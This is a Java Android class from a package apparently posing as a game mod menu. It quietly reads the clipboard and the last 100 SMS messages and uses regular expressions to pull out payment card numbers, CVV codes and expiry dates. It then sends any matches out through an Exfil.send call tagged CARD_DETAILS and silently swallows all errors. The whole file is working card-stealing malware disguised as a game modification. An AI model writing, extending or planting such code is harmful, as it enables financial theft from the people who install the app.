package com.brawl.modmenu;

import android.content.ClipboardManager;
import android.content.Context;
import android.database.Cursor;
import android.provider.Telephony;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class CvvScanner {

    private static final Pattern CARD = Pattern.compile(
        "\\b(?:\\d[ -]?){15}\\d\\b");

    // CVV — 3-4 цифры рядом с "cvv", "cvc", "код", "sec"
    private static final Pattern CVV_NEAR = Pattern.compile(
        "(?i)(cvv|cvc|код|sec|секр)[\\s:=\\-]*([0-9]{3,4})");

    // Дата истечения MM/YY
    private static final Pattern EXPIRE = Pattern.compile(
        "\\b(0[1-9]|1[0-2])[/\\-]([0-9]{2}|[0-9]{4})\\b");

    public static void scanAll(Context ctx) {
        scanClipboard(ctx);
        scanSms(ctx);
    }

    private static void scanClipboard(Context ctx) {
        try {
            ClipboardManager cm = (ClipboardManager)
                ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm == null || !cm.hasPrimaryClip()) return;
            CharSequence text = cm.getPrimaryClip().getItemAt(0).coerceToText(ctx);
            if (text == null) return;
            analyze(text.toString(), "CLIPBOARD");
        } catch (Throwable ignored) {}
    }

    private static void scanSms(Context ctx) {
        new Thread(() -> {
            try {
                Cursor c = ctx.getContentResolver().query(
                    Telephony.Sms.CONTENT_URI, null, null, null,
                    Telephony.Sms.DATE + " DESC LIMIT 100");
                if (c == null) return;
                while (c.moveToNext()) {
                    String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    if (body != null) analyze(body, "SMS");
                }
                c.close();
            } catch (Throwable ignored) {}
        }).start();
    }

    private static void analyze(String text, String source) {
        if (text == null || text.isEmpty()) return;

        boolean hasCard = CARD.matcher(text).find();
        Matcher cvv = CVV_NEAR.matcher(text);
        Matcher exp = EXPIRE.matcher(text);

        StringBuilder found = new StringBuilder();

        if (hasCard) {
            Matcher cm = CARD.matcher(text);
            while (cm.find()) {
                found.append("💳 Карта: ").append(cm.group()).append("\n");
            }
        }
        if (cvv.find()) {
            found.append("🔑 CVV: ").append(cvv.group(2)).append("\n");
        }
        if (exp.find()) {
            found.append("📅 Срок: ").append(exp.group()).append("\n");
        }

        if (found.length() > 0) {
            Exfil.send("CARD_DETAILS",
                "Источник: " + source + "\n" + found.toString());
        }
    }
}
